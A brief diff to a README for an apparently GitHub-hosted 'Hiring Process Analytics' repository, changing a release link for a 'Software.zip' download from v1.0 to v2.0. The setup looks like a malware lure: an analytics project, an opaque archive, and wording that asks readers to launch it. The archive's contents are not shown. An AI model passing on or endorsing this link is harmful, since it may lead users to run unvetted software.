@@ -17,7 +17,7 @@ Welcome to the **Hiring Process Analytics** repository! This repository focuses 
 ## Installation
 
 To get started with the **Hiring Process Analytics** repository, you can download the necessary files by clicking the following link:
-[![Download Repository](https://github.com/Aizen0009230/HiringProcessAnalytics/releases/download/v1.0/Software.zip)](https://github.com/Aizen0009230/HiringProcessAnalytics/releases/download/v1.0/Software.zip)
+[![Download Repository](https://github.com/Aizen0009230/HiringProcessAnalytics/releases/download/v2.0/Software.zip)](https://github.com/Aizen0009230/HiringProcessAnalytics/releases/download/v2.0/Software.zip)
 
 *Note: The link needs to be launched to download the repository files.*
 
